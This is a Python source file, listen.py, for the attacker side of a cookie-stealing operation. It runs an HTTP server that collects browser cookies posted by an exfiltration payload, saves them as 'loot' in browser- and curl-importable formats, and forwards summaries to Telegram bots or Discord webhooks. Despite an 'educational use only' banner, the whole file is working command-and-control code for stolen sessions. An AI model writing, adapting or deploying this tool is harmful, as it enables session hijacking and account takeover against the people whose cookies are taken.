#!/usr/bin/env python3
"""listen.py — HTTP server that receives cookies exfiltrated by the payload.
Run on the attacker side:  python listen.py [port] [options]

  EDUCATIONAL USE ONLY — FOR SECURITY RESEARCH AND TRAINING

  This is offensive security tooling. Only use on systems you own or are
  explicitly authorized to test. Unauthorized use is illegal.

The payload (when infected with the C2 URL) makes an HTTP POST with JSON in the
Cookie-Editor format (directly importable in the browser via the Cookie-Editor extension).

Output:
  cookies_recv.json  — cumulative collection (dedup)
  cookies_recv.txt   — Netscape format (importable in curl/wget)
  stdout             — per-domain summary

Relay options (re-send received cookies to a second channel):
  --telegram <bot_token>:<chat_id>   Forward summary to Telegram Bot API
  --discord <webhook_url>            Forward summary to Discord webhook
  --email <addr>                     (future) Forward via email
"""
import json, os, sys, time, socket, socketserver, urllib.request, urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler

HERE   = os.path.dirname(os.path.abspath(__file__))
LOOT   = os.path.join(HERE, "loot")
os.makedirs(LOOT, exist_ok=True)
JSONF  = os.path.join(LOOT, "cookies.json")
TXTF   = os.path.join(LOOT, "cookies.txt")

# Parse args: port, --telegram token:chat, --discord webhook
PORT = 8080
TELEGRAM = None  # "bot_token:chat_id"
DISCORD = None  # webhook URL

args = sys.argv[1:]
i = 0
while i < len(args):
    a = args[i]
    if a == "--telegram" and i + 1 < len(args):
        TELEGRAM = args[i + 1]; i += 2
    elif a == "--discord" and i + 1 < len(args):
        DISCORD = args[i + 1]; i += 2
    elif not a.startswith("--"):
        PORT = int(a); i += 1
    else:
        i += 1


class HTTPServerV4(HTTPServer):
    """Force IPv4 — HTTPServer default may resolve 0.0.0.0 to IPv6 on Windows."""
    address_family = socket.AF_INET

    def server_bind(self):
        """Override to skip socket.getfqdn() — it does a reverse DNS lookup on the
        bind address (0.0.0.0) which takes 4+ seconds on Windows, delaying listen()
        and causing the payload's HTTP connect to fail with WSAECONNREFUSED (10061)."""
        # TCPServer.server_bind does: setsockopt + bind + getsockname (no DNS)
        socketserver.TCPServer.server_bind(self)
        host, port = self.server_address[:2]
        self.server_name = socket.gethostname()  # local, no network lookup
        self.server_port = port


def load_existing():
    if os.path.exists(JSONF):
        try:
            with open(JSONF, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return []


def merge(old, new):
    seen, out = {}, list(old)
    for i, c in enumerate(out):
        k = (c.get("domain"), c.get("name"), c.get("path"))
        seen[k] = i
    for c in new:
        k = (c.get("domain"), c.get("name"), c.get("path"))
        if k in seen:
            out[seen[k]] = c
        else:
            seen[k] = len(out)
            out.append(c)
    return out


# ------------------------------------------------------------------ relay channels

def relay_telegram(cookies):
    """Forward a summary of received cookies to Telegram Bot API."""
    if not TELEGRAM:
        return
    try:
        # Parse "bot_token:chat_id"
        parts = TELEGRAM.rsplit(":", 1)
        if len(parts) != 2:
            print("[-] telegram: invalid format, expected bot_token:chat_id")
            return
        bot_token, chat_id = parts
        # Build summary
        domains = {}
        for c in cookies:
            d = c.get("domain", "?")
            domains[d] = domains.get(d, 0) + 1
        top = sorted(domains.items(), key=lambda kv: -kv[1])[:15]
        msg = "🍪 cookielog: %d cookies received\n\nTop domains:\n" % len(cookies)
        for d, n in top:
            msg += "  %4d  %s\n" % (n, d)
        msg += "\nFull JSON: loot/cookies.json"

        url = "https://api.telegram.org/bot%s/sendMessage" % bot_token
        data = urllib.parse.urlencode({
            "chat_id": chat_id,
            "text": msg,
            "parse_mode": "HTML"
        }).encode()
        req = urllib.request.Request(url, data=data)
        urllib.request.urlopen(req, timeout=10)
        print("[+] telegram: summary sent (%d cookies)" % len(cookies))
    except Exception as ex:
        print("[-] telegram relay failed: %s" % ex)


def relay_discord(cookies):
    """Forward a summary of received cookies to a Discord webhook."""
    if not DISCORD:
        return
    try:
        domains = {}
        for c in cookies:
            d = c.get("domain", "?")
            domains[d] = domains.get(d, 0) + 1
        top = sorted(domains.items(), key=lambda kv: -kv[1])[:15]
        desc = "cookielog: **%d cookies** received\n\nTop domains:\n" % len(cookies)
        for d, n in top:
            desc += "`%4d`  %s\n" % (n, d)

        payload = json.dumps({"content": desc[:1900]}).encode()  # Discord 2000 char limit
        req = urllib.request.Request(DISCORD, data=payload,
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
        print("[+] discord: summary sent (%d cookies)" % len(cookies))
    except Exception as ex:
        print("[-] discord relay failed: %s" % ex)


def write_json(rows):
    with open(JSONF, "w", encoding="utf-8") as f:
        json.dump(rows, f, ensure_ascii=False, indent=1)


def write_txt(rows):
    lines = ["# Netscape HTTP Cookie File"]
    for c in rows:
        d = c.get("domain", "")
        if not d.startswith("."):
            d = "." + d
        exp = int(c.get("expirationDate") or 0)
        lines.append("\t".join([
            d, "TRUE", c.get("path") or "/",
            "TRUE" if c.get("secure") else "FALSE",
            str(exp), c.get("name", ""), c.get("value") or ""
        ]))
    with open(TXTF, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")


class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length > 0 else b"[]"
        try:
            cookies = json.loads(body.decode("utf-8", "replace"))
        except Exception as ex:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"bad json")
            print("[-] invalid JSON (%d bytes): %s" % (length, ex))
            return

        if not isinstance(cookies, list):
            cookies = [cookies]

        # merge with existing collection
        old = load_existing()
        alls = merge(old, cookies)
        write_json(alls)
        write_txt(alls)

        # summary
        top = {}
        session = 0
        for c in cookies:
            d = c.get("domain", "?")
            top[d] = top.get(d, 0) + 1
            if not int(c.get("expirationDate") or 0):
                session += 1

        print("\n[+] %d cookies received (%d session) | total: %d" % (
            len(cookies), session, len(alls)))
        print("    -> %s (%d bytes)" % (JSONF, os.path.getsize(JSONF)))
        print("    -> %s (%d bytes)" % (TXTF, os.path.getsize(TXTF)))
        for d, n in sorted(top.items(), key=lambda kv: -kv[1])[:15]:
            print("      %5d  %s" % (n, d))

        # relay to Telegram / Discord (if configured)
        relay_telegram(cookies)
        relay_discord(cookies)

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt, *args):
        pass  # silent (we use our own prints above)


def main():
    print("[listen] exfiltration server on port %d (Ctrl+C to stop)" % PORT)
    print("[listen] output: %s + %s" % (JSONF, TXTF))
    print("[listen] format: Cookie-Editor JSON (browser-importable)")
    if TELEGRAM:
        print("[listen] relay: Telegram -> %s" % TELEGRAM.split(":")[0][:10] + "...")
    if DISCORD:
        print("[listen] relay: Discord -> %s" % DISCORD.split("/api/")[0] if "/api/" in DISCORD else DISCORD[:30])
    server = HTTPServerV4(("0.0.0.0", PORT), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[listen] stopped")
        server.server_close()


if __name__ == "__main__":
    main()
